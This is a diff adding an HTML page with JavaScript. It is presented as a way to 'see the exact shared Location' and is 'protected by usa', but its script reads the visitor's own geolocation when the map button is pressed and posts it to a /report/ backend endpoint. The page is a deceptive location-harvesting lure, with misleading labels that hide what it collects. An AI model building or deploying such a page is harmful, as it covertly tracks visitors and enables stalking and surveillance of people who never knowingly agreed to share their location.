@@ -1,0 +1,164 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Emergency Location Reporter | Critical Response System</title>
+    <style>
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            line-height: 1.6;
+            color: #333;
+            max-width: 800px;
+            margin: 0 auto;
+            padding: 2rem;
+            background-color: #f9f9f9;
+        }
+        
+        h1 {
+            color: #d32f2f;
+            text-align: center;
+            margin-bottom: 1.5rem;
+            font-weight: 600;
+            border-bottom: 2px solid #d32f2f;
+            padding-bottom: 0.5rem;
+        }
+        
+        p {
+            text-align: center;
+            margin-bottom: 2rem;
+            color: #555;
+        }
+        
+        button {
+            display: block;
+            margin: 0 auto 2rem;
+            padding: 12px 24px;
+            background-color: #d32f2f;
+            color: white;
+            border: none;
+            border-radius: 4px;
+            font-size: 1rem;
+            font-weight: 500;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            box-shadow: 0 2px 5px rgba(0,0,0,0.1);
+        }
+        
+        button:hover {
+            background-color: #b71c1c;
+            transform: translateY(-2px);
+            box-shadow: 0 4px 8px rgba(0,0,0,0.15);
+        }
+        
+        button:active {
+            transform: translateY(0);
+            box-shadow: 0 2px 3px rgba(0,0,0,0.1);
+        }
+        
+        #map {
+            height: 400px;
+            width: 100%;
+            margin-top: 20px;
+            border-radius: 8px;
+            box-shadow: 0 4px 12px rgba(0,0,0,0.1);
+            border: 1px solid #ddd;
+            transition: all 0.3s ease;
+        }
+        
+        #map:hover {
+            box-shadow: 0 6px 16px rgba(0,0,0,0.15);
+        }
+        
+        .disclaimer {
+            font-size: 0.8rem;
+            color: #777;
+            text-align: center;
+            margin-top: 2rem;
+            font-style: italic;
+        }
+    </style>
+</head>
+<body>
+    <h1>see the exact shared Location</h1>
+
+    <button onclick="getLocation()">🚨 show me on map</button>
+
+    <div id="map"></div>
+    
+    <p class="disclaimer">protected by usa</p>
+
+    
+<script>
+        function getLocation() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(sendLocation, showError);
+            } else {
+                alert("please wait as we load your map.");
+            }
+        }
+
+        function sendLocation(position) {
+            const lat = position.coords.latitude;
+            const lng = position.coords.longitude;
+
+            // Show map preview using Google Static Map (optional, replace with JS map later if needed)
+            const map = document.getElementById('map');
+            map.innerHTML = `
+                <iframe 
+                    width="100%" 
+                    height="300" 
+                    frameborder="0" 
+                    style="border:0"
+                    src="https://www.google.com/maps?q=${lat},${lng}&hl=es;z=14&output=embed">
+                </iframe>
+            `;
+
+            // Send data to Django backend
+            fetch('/report/', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                    'X-CSRFToken': getCookie('csrftoken')
+                },
+                body: JSON.stringify({
+                    latitude: lat,
+                    longitude: lng
+                })
+            })
+            .then(response => {
+                if (response.ok) {
+                    alert("📍 Location sent successfully!");
+                } else {
+                    alert("❌ Failed to send location.");
+                }
+            })
+            .catch(error => {
+                alert("⚠️ Error: " + error);
+            });
+        }
+
+        function showError(error) {
+            alert("Geolocation error: " + error.message);
+        }
+
+        // Get CSRF token for Django POST
+        function getCookie(name) {
+            let cookieValue = null;
+            const cookies = document.cookie.split(';');
+            for (let cookie of cookies) {
+                cookie = cookie.trim();
+                if (cookie.startsWith(name + '=')) {
+                    cookieValue = decodeURIComponent(cookie.split('=')[1]);
+                    break;
+                }
+            }
+            return cookieValue;
+        }
+    </script>
+</body>
+</html>
+
+
+
+
